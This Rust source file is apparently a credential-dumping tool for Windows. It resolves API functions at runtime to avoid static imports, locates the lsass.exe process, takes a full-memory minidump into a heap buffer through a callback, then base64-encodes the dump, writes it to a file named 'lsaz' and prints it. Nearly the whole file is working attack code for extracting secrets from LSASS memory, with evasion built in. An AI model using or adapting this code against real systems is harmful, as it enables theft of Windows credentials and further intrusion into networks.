#![allow(non_snake_case)]
use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::{DWORD_PTR, SIZE_T},
        ntdef::{
            HRESULT,
            LUID,
            NTSTATUS,
        },

        minwindef::{BOOL, DWORD, FARPROC, HMODULE, LPCVOID, LPVOID, MAX_PATH, PDWORD},
        winerror::{
            ERROR_NOT_ALL_ASSIGNED,
            S_FALSE,
            S_OK
        },
    },
    um::{
        libloaderapi::{GetProcAddress, LoadLibraryW}, // resolve these dynamically
        winnt::{
            ACCESS_MASK,
            HEAP_ZERO_MEMORY,
            LUID_AND_ATTRIBUTES,
            MAXIMUM_ALLOWED,
            PTOKEN_PRIVILEGES,
            RtlCopyMemory,
            SE_DEBUG_NAME,
            SE_PRIVILEGE_ENABLED,
            TOKEN_ADJUST_PRIVILEGES,
            TOKEN_PRIVILEGES,
            TOKEN_QUERY,
        },
    },
};
pub struct PROCESS_MEMORY_COUNTERS {
    pub cb: DWORD,
    pub PageFaultCount: DWORD,
    pub PeakWorkingSetSize: SIZE_T,
    pub WorkingSetSize: SIZE_T,
    pub QuotaPeakPagedPoolUsage: SIZE_T,
    pub QuotaPagedPoolUsage: SIZE_T,
    pub QuotaPeakNonPagedPoolUsage: SIZE_T,
    pub QuotaNonPagedPoolUsage: SIZE_T,
    pub PagefileUsage: SIZE_T,
    pub PeakPagefileUsage: SIZE_T,
}
use std::{ffi::OsStr, fs, mem::{drop, forget, MaybeUninit, size_of, size_of_val}, os::windows::ffi::OsStrExt, slice::from_raw_parts_mut};
use std::io::Write;
use winapi::um::winnt::{HANDLE, LPCWSTR};

// dynamically resolved functions
// dll handles and locate function
fn get_dll(dll_name: &str) -> HMODULE {
    let handle = unsafe { LoadLibraryW(get_wide(dll_name).as_ptr()) };
    if handle.is_null() {
        return 0 as _
    }
    handle
}

fn get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let func = unsafe { GetProcAddress(dll, fn_name.as_ptr() as _) };
    if func.is_null() {
        return 0 as _
    }
    func
}

// heapapi
fn get_process_heap() -> Option<unsafe fn() -> HANDLE> {
    let k32_handle = get_dll(("kernel32.dll"));
    let func = get_fn(k32_handle, ("GetProcessHeap\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_alloc() -> Option<unsafe fn(HANDLE, DWORD, SIZE_T) -> LPVOID> {
    let k32_handle = get_dll(("kernel32.dll"));
    let func = get_fn(k32_handle, ("HeapAlloc\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_realloc() -> Option<unsafe fn(HANDLE, DWORD, LPVOID, SIZE_T) -> LPVOID> {
    let k32_handle = get_dll(("kernel32.dll"));
    let func = get_fn(k32_handle, ("HeapReAlloc\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_free() -> Option<unsafe fn(HANDLE, DWORD, LPVOID) -> bool> {
    let k32_handle = get_dll(("kernel32.dll"));
    let func = get_fn(k32_handle, ("HeapFree\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_size() -> Option<unsafe fn(HANDLE, DWORD, LPCVOID) -> SIZE_T> {
    let k32_handle = get_dll(("kernel32.dll"));
    let func = get_fn(k32_handle, ("HeapSize\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

// define enums and structs
#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_CALLBACK_TYPE(pub i32);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_CALLBACK_TYPE {
    const ModuleCallback: Self = Self(0);
    const ThreadCallback: Self = Self(1);
    const ThreadExCallback: Self = Self(2);
    const IncludeThreadCallback: Self = Self(3);
    const IncludeModuleCallback: Self = Self(4);
    const MemoryCallback: Self = Self(5);
    const CancelCallback: Self = Self(6);
    const WriteKernelMinidumpCallback: Self = Self(7);
    const KernelMinidumpStatusCallback: Self = Self(8);
    const RemoveMemoryCallback: Self = Self(9);
    const IncludeVmRegionCallback: Self = Self(10);
    const IoStartCallback: Self = Self(11);
    const IoWriteAllCallback: Self = Self(12);
    const IoFinishCallback: Self = Self(13);
    const ReadMemoryFailureCallback: Self = Self(14);
    const SecondaryFlagsCallback: Self = Self(15);
    const IsProcessSnapshotCallback: Self = Self(16);
    const VmStartCallback: Self = Self(17);
    const VmQueryCallback: Self = Self(18);
    const VmPreReadCallback: Self = Self(19);
    const VmPostReadCallback: Self = Self(20);
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_OUTPUT {
    status: HRESULT
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INPUT {
    process_id: i32,
    process_handle: *mut c_void,
    callback_type: MINIDUMP_CALLBACK_TYPE,
    io: MINIDUMP_IO_CALLBACK,
}
#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INFORMATION<'a> {
    CallbackRoutine: *mut c_void,
    CallbackParam: &'a mut *mut c_void,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_IO_CALLBACK {
    handle: *mut c_void,
    offset: u64,
    buffer: *mut c_void,
    buffer_bytes: u32
}

#[repr(transparent)]
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
#[allow(non_camel_case_types)]
struct MINIDUMP_TYPE(pub i64);
#[allow(non_upper_case_globals)]
#[allow(dead_code)]
impl MINIDUMP_TYPE {
    const MiniDumpNormal: Self = Self(0);
    const MiniDumpWithDataSegs: Self = Self(1);
    const MiniDumpWithFullMemory: Self = Self(2);
    const MiniDumpWithHandleData: Self = Self(3);
    const MiniDumpFilterMemory: Self = Self(4);
    const MiniDumpScanMemory: Self = Self(5);
    const MiniDumpWithUnloadedModules: Self = Self(6);
    const MiniDumpWithIndirectlyReferencedMemory: Self = Self(7);
    const MiniDumpFilterModulePaths: Self = Self(8);
    const MiniDumpWithProcessThreadData: Self = Self(9);
    const MiniDumpWithPrivateReadWriteMemory: Self = Self(10);
    const MiniDumpWithoutOptionalData: Self = Self(11);
    const MiniDumpWithFullMemoryInfo: Self = Self(12);
    const MiniDumpWithThreadInfo: Self = Self(13);
    const MiniDumpWithCodeSegs: Self = Self(14);
    const MiniDumpWithoutAuxiliaryState: Self = Self(15);
    const MiniDumpWithFullAuxiliaryState: Self = Self(16);
    const MiniDumpWithPrivateWriteCopyMemory: Self = Self(17);
    const MiniDumpIgnoreInaccessibleMemory: Self = Self(18);
    const MiniDumpWithTokenInformation: Self = Self(19);
    const MiniDumpWithModuleHeaders: Self = Self(20);
    const MiniDumpFilterTriage: Self = Self(21);
    const MiniDumpWithAvxXStateContext: Self = Self(22);
    const MiniDumpWithIptTrace: Self = Self(23);
    const MiniDumpScanInaccessiblePartialPages: Self = Self(24);
    const MiniDumpValidTypeFlags: Self = Self(25);
}

type PPROCESS_MEMORY_COUNTERS=*mut PROCESS_MEMORY_COUNTERS;
pub fn get_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}


pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_CALLBACK_INPUT, callbackOutput: &mut MINIDUMP_CALLBACK_OUTPUT) -> bool {
    match callbackInput.callback_type {
        MINIDUMP_CALLBACK_TYPE::IoStartCallback => {
            callbackOutput.status = S_FALSE;
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoWriteAllCallback => {
            callbackOutput.status = S_OK;
            let read_buf_size = callbackInput.io.buffer_bytes;
            let GetProcessHeap = get_process_heap().unwrap();
            let HeapSize = heap_size().unwrap();
            let HeapReAlloc = heap_realloc().unwrap();
            let current_buf_size = unsafe { HeapSize(
                GetProcessHeap(),
                0 as _,
                *buf
            ) };
            // check if buffer is large enough
            let extra_5mb: usize = 1024*1024 * 5;
            let bytes_and_offset = callbackInput.io.offset as usize + callbackInput.io.buffer_bytes as usize;
            if bytes_and_offset >= current_buf_size {
                // increase heap size
                let size_to_increase = if bytes_and_offset <= (current_buf_size*2) {
                    current_buf_size * 2
                } else {
                    bytes_and_offset + extra_5mb
                };
                *buf = unsafe { HeapReAlloc(
                    GetProcessHeap(),
                    0 as _,
                    *buf,
                    size_to_increase
                )};
            }

            let source = callbackInput.io.buffer as *mut c_void;
            let destination = (*buf as DWORD_PTR + callbackInput.io.offset as DWORD_PTR) as LPVOID;
            let _ =  unsafe {
                RtlCopyMemory(
                    destination,
                    source,
                    read_buf_size as usize
                )
            };
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoFinishCallback => {
            callbackOutput.status = S_OK;
            return true
        },
        _ => {
            return true
        },
    }
}

pub fn in_memory_dump(toDump: u32) -> String {

    // extract argument
    let mut pid = toDump;

    // get DLL handles and locate functions
    let dbghelp_handle = get_dll("C:\\Windows\\System32\\dbghelp.dll");
    let k32_handle = get_dll("kernel32.dll");
    let ntdll_handle = get_dll("ntdll.dll");
    let psapi_handle = get_dll("psapi.dll");
    let getnext_func = get_fn(ntdll_handle, "NtGetNextProcess\0");
    let mdwd_func = get_fn(dbghelp_handle, "MiniDumpWriteDump\0");
    let getfilename_func = get_fn(psapi_handle, "GetModuleFileNameExW\0");
    let getmeminfo_func = get_fn(psapi_handle, "GetProcessMemoryInfo\0");
    let getpid_func = get_fn(k32_handle, "GetProcessId\0");
    let freelib_func = get_fn(k32_handle, "FreeLibrary\0");

    // define functions
    let MiniDumpWriteDump: unsafe fn(
        HANDLE,
        DWORD,
        HANDLE,
        u64,
        *mut c_void,
        *mut c_void,
        *mut MINIDUMP_CALLBACK_INFORMATION
    ) -> bool = unsafe { std::mem::transmute(mdwd_func as FARPROC) };

    let FreeLibrary: unsafe fn(
        HMODULE,
    ) -> bool = unsafe { std::mem::transmute(freelib_func as FARPROC) };

    let NtGetNextProcess: unsafe fn(
        HANDLE,
        ACCESS_MASK,
        u32,
        u32,
        *mut HANDLE,
    ) -> NTSTATUS = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let GetModuleFileNameExW: unsafe fn(
        HANDLE,
        HMODULE,
        *mut u16,
        DWORD,
    ) -> DWORD = unsafe { std::mem::transmute(getfilename_func as FARPROC) };

    let GetProcessId: unsafe fn(
        HANDLE
    ) -> DWORD = unsafe { std::mem::transmute(getpid_func as FARPROC) };

    let GetProcessMemoryInfo: unsafe fn(
        HANDLE,
        PPROCESS_MEMORY_COUNTERS,
        DWORD,
    ) -> BOOL = unsafe { std::mem::transmute(getmeminfo_func as FARPROC) };

    #[allow(unused_assignments)]
        let mut handle: HANDLE = 0 as _;

    while unsafe { NtGetNextProcess(
        handle,
        MAXIMUM_ALLOWED,
        0,
        0,
        &mut handle,
    )} == 0 {
        let mut buf = [0; MAX_PATH];
        let _ = unsafe { GetModuleFileNameExW(
            handle,
            0 as _,
            &mut buf[0],
            MAX_PATH as _,
        )};
        let buf_str = String::from_utf16_lossy(&buf[..MAX_PATH]);
        if pid == 0 {
            if buf_str.contains("C:\\Windows\\System32\\lsass.exe") {
                // get lsass.exe handle
                pid = unsafe { GetProcessId(handle) };
                break;
            }
        } else {
            if pid == unsafe { GetProcessId(handle) } {
                break;
            }
        }
    }

    if handle.is_null() {
        return ("could not open PID").to_string()
    }



    // get lsass size and add padding
    let extra_5mb: usize = 1024*1024 * 5;
    let buf_size: usize;
    let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
    let gpm_ret = unsafe { GetProcessMemoryInfo(
        handle,
        pmc.as_mut_ptr(),
        size_of_val(&pmc) as DWORD
    )};
    if gpm_ret != 0 {
        let pmc = unsafe { pmc.assume_init() };
        buf_size = pmc.WorkingSetSize + extra_5mb;
    } else {
        return "".to_string()
    }

    // alloc memory in current process
    let GetProcessHeap = get_process_heap().unwrap();
    let HeapAlloc = heap_alloc().unwrap();
    let mut buf = unsafe { HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        buf_size
    )};
    forget(buf);

    // set up minidump callback
    let mut callback_info = MINIDUMP_CALLBACK_INFORMATION {
        CallbackRoutine: minidump_callback_routine as _,
        CallbackParam: &mut buf,
    };
    let _ = unsafe{ MiniDumpWriteDump(
        handle,
        pid,
        0 as _,
        0x00000002,//MINIDUMP_TYPE::MiniDumpWithFullMemory,
        0 as _,
        0 as _,
        &mut callback_info
    )};
    let _ = unsafe { FreeLibrary(dbghelp_handle) };

    // base64
    let buf_slice: &mut [u8] = unsafe { from_raw_parts_mut(buf as _, buf_size) };
    let buf_b64 = base64::encode(buf_slice);
    let mut file = fs::OpenOptions::new()
        // .create(true) // To create a new file
        .write(true)
        // either use the ? operator or unwrap since it returns a Result
        .open("./lsaz").unwrap();

    file.write_all(buf_b64.as_bytes());
    println!("{:?}",buf_b64);
    // drop allocated memory
    let HeapFree = heap_free().unwrap();
    let _ = unsafe { HeapFree(
        GetProcessHeap(),
        0 as _,
        buf
    )};


    drop(file);
    drop(buf);

    return buf_b64
}